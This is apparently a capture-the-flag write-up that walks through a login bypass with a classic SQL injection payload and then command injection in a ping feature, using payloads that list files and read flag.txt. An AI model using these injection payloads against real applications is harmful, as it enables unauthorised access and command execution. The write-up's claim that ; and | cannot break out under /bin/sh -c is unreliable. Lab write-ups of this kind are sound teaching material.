1. Login Page – Classic SQL Injection

The challenge starts with a simple login form. No tricks — just pure, beautiful SQLi.

Payload:

Username: ' OR 1=1-- -
Password: anything

Resulting Query:

SELECT * FROM users WHERE username = '' OR 1=1-- -' AND password = '...';

2. Dashboard – The Ping Tool

Once logged in, we get a "Test Connection" feature that pings any host we enter.

Trying 127.0.0.1 returns real ping output → command injection confirmed.

3. Discovering the Injection Point

The backend likely runs:

/bin/sh -c "ping -c 4 <user_input>"

Because of /bin/sh -c, normal separators like ; or | are treated as ping arguments → they don’t break out.

But & and && work perfectly!

4. Listing Files

Payload:

127.0.0.1 & ls

Or better (to avoid ping noise):

127.0.0.1 & echo "$(ls)"

→ Reveals flag.txt

5. Reading the Flag

Final payload:

127.0.0.1 & cat flag.txt

Or cleaner:

127.0.0.1 & echo "$(cat flag.txt)"
